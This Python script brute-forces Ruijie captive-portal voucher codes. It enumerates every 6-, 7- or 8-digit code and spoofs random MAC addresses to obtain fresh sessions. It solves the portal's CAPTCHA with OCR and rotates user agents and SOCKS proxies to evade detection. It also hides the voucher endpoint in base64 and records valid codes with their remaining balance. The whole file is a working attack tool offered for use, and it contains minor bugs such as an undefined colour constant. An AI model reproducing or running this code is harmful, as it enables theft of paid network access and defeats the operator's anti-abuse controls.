#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import re
import time
import base64
import sys
import os
import cv2
import ddddocr
import numpy as np
from aiohttp_socks import ProxyConnector

# ── HACKER UI ──────────────────────────────────────────────────────────
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    banner = f"""
{Colors.RED}   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
{Colors.RED}  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
{Colors.YELLOW}  ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
{Colors.YELLOW}  ▐░▌          ▐░▌          ▐░▌          ▐░▌          
{Colors.GREEN}  ▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌          
{Colors.GREEN}  ▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          
{Colors.CYAN}  ▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          
{Colors.CYAN}  ▐░▌          ▐░▌          ▐░▌          ▐░▌          
{Colors.MAGENTA}  ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌          ▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ 
{Colors.MAGENTA}  ▐░░░░░░░░░░░▌▐░▌          ▐░▌          ▐░░░░░░░░░░░▌
{Colors.RED}   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀          ▀▀▀          ▀▀▀▀▀▀▀▀▀▀▀ 
{Colors.GREEN}
{Colors.GREEN}  ╔═══════════════════════════════════════════════════════╗
{Colors.GREEN}  ║   🔥 RUIJIE SCANNER - ULTIMATE EDITION  🔥          ║
{Colors.GREEN}  ║   🧠 CAPTCHA : ddddocr + OpenCV  |  🌐 Proxy : ON   ║
{Colors.GREEN}  ╚═══════════════════════════════════════════════════════╝
{Colors.RESET}
    """
    print(banner)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def cprint(text, color=Colors.WHITE, bold=False):
    b = Colors.BOLD if bold else ""
    print(f"{b}{color}{text}{Colors.RESET}")

# ── CONFIG ──────────────────────────────────────────────────────────────
clear_screen()
print_banner()

cprint("\n[+] Initializing Scanner...", Colors.CYAN, bold=True)
time.sleep(0.5)

SESSION_URL = input(f"{Colors.YELLOW}🔑 Enter Portal URL: {Colors.RESET}").strip()
THREADS = 20
BATCH_SIZE = 100
DELAY = 0.1

# ── PROXY ──────────────────────────────────────────────────────────────
USE_PROXY = input(f"{Colors.YELLOW}🌐 Use Proxy? (y/n): {Colors.RESET}").strip().lower() == 'y'
PROXY_LIST = []
if USE_PROXY:
    cprint("[+] Loading proxies...", Colors.CYAN)
    try:
        with open("proxies.txt", "r") as f:
            PROXY_LIST = [line.strip() for line in f if line.strip()]
        cprint(f"[+] Loaded {len(PROXY_LIST)} proxies", Colors.GREEN)
    except:
        cprint("[!] No proxies.txt found. Using direct connection.", Colors.RED)
        USE_PROXY = False

def get_proxy():
    if USE_PROXY and PROXY_LIST:
        return random.choice(PROXY_LIST)
    return None

# ── OCR (ddddocr + OpenCV) ──────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buf = cv2.imencode('.png', th)
        return _ocr.classification(buf.tobytes()).upper()
    except:
        return None

async def captcha_text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

# ── GLOBALS ──────────────────────────────────────────────────────────────
found_codes = []
checked = 0
stop_scan = False

# ── HELPERS ──────────────────────────────────────────────────────────────

def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
]

def random_user_agent():
    return random.choice(USER_AGENTS)

async def get_session_id(sess, session_url, prev_sid=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {'user-agent': random_user_agent(), 'accept': 'text/html'}
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, timeout=5) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else prev_sid
    except:
        return prev_sid

async def captcha_image(sess, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    headers = {'user-agent': random_user_agent()}
    try:
        async with sess.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image',
                           params=params, headers=headers, timeout=5) as req:
            return await req.read()
    except:
        return None

async def verify_captcha(sess, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    headers = {'user-agent': random_user_agent(), 'content-type': 'application/json'}
    try:
        async with sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
                            headers=headers, json=json_data, timeout=5) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except:
        return None

async def get_balance_info(session_id):
    endpoints = [
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}",
    ]
    headers = {'user-agent': random_user_agent(), 'accept': 'application/json'}
    async with aiohttp.ClientSession() as temp:
        for url in endpoints:
            try:
                async with temp.get(url, headers=headers, timeout=8) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json()
                    if not data.get("success", False):
                        continue
                    result = data.get("result", {})
                    minutes = result.get("totalMinutes") or result.get("remainingMinutes") or 0
                    plan_name = result.get("profileName") or "Unknown"
                    if minutes > 0:
                        return f"📋 {plan_name} | ⏱ {int(minutes)}m"
            except:
                continue
    return "📋 Unknown | ⏱ N/A"

async def perform_check(code, session_url, session_id_cache=None):
    global found_codes
    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()
    
    session_id = session_id_cache
    timeout = aiohttp.ClientTimeout(total=10, connect=3)
    proxy = get_proxy()
    
    for attempt in range(3):
        try:
            connector = None
            if proxy:
                connector = ProxyConnector.from_url(f"socks5://{proxy}")
            
            async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as sess:
                if not session_id:
                    session_id = await get_session_id(sess, session_url)
                    if not session_id:
                        return None
                
                image = await captcha_image(sess, session_id)
                if not image:
                    return None
                text = await captcha_text(image)
                if not text:
                    return None
                if not await verify_captcha(sess, session_id, text):
                    return None
                
                data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}
                headers = {"user-agent": random_user_agent(), "content-type": "application/json", "accept": "*/*"}
                
                async with sess.post(post_url, json=data, headers=headers, timeout=8) as req:
                    response = await req.text()
                    if 'logonUrl' in response:
                        balance = await get_balance_info(session_id)
                        found_codes.append(f"{code} | {balance}")
                        return {"code": code, "balance": balance}
                    elif 'STA' in response:
                        return {"code": code, "status": "limited"}
        except:
            pass
        await asyncio.sleep(0.5)
    return None

def digit_generator(length):
    codes = [str(i).zfill(length) for i in range(10 ** length)]
    random.shuffle(codes)
    for c in codes:
        yield c

async def main():
    global checked, stop_scan
    
    mode = input(f"{Colors.YELLOW}📊 Mode (6/7/8): {Colors.RESET}").strip()
    if mode not in ["6", "7", "8"]:
        cprint("❌ Invalid mode!", Colors.RED)
        return
    
    total = 10 ** int(mode)
    cprint(f"\n🚀 Starting scan for {mode}-digit codes...\n", Colors.GREEN, bold=True)
    
    code_iter = digit_generator(int(mode))
    sem = asyncio.Semaphore(THREADS)
    session_cache = None
    start_time = time.time()
    
    async def _check(code):
        nonlocal session_cache
        async with sem:
            await asyncio.sleep(DELAY)
            result = await perform_check(code, SESSION_URL, session_cache)
            if result and result.get("code"):
                cprint(f"\n✅ Found: {result['code']} | {result.get('balance', 'N/A')}", Colors.GREEN, bold=True)
            return result
    
    try:
        while True:
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            
            results = await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)
            
            elapsed = time.time() - start_time
            speed = int((checked / elapsed) * 60) if elapsed > 0 else 0
            progress = min(100, (checked / total) * 100)
            
            sys.stdout.write(f"\r{Colors.CYAN}📦 Checked:{Colors.RESET} {checked:,}/{total:,} | {Colors.GREEN}📊 Progress:{Colors.RESET} {progress:.1f}% | {Colors.YELLOW}⚡ Speed:{Colors.RESET} {speed}/min | {Colors.MAGENTA}✅ Found:{Colors.RESET} {len(found_codes)}")
            sys.stdout.flush()
    
    except KeyboardInterrupt:
        cprint("\n\n⏹️ Stopped by user", Colors.RED)
    
    cprint(f"\n\n🏁 Scan completed! Found: {len(found_codes)} codes", Colors.GREEN, bold=True)
    if found_codes:
        cprint("\n✅ Found Codes:", Colors.GREEN, bold=True)
        for c in found_codes:
            cprint(f"  {c}", Colors.YELLOW)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        cprint("\n👋 Goodbye!", Colors.CYAN)
